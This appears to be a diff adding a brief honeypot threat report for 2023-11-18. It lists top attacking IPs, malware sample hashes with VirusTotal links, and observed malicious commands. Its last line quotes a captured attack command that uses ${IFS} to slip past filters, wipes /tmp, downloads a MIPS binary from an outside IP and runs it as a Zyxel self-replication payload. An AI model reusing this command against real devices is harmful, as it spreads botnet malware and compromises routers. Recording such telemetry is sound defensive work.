@@ -1,0 +1,22 @@
+Top 5 IPs for 2023-11-18:
+82.157.141.149
+50.81.182.78
+167.172.95.146
+125.138.3.247
+14.34.210.53
+
+Crypto download: 94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00 (file name sshd)
+Sample available over here: https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+Other downloaded sample:
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+
+
+Malicious commands seen:
+
+/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.110.33.164/mips;${IFS}chmod${IFS}777${IFS}mips;${IFS}./mips${IFS}zyxel.selfrep;
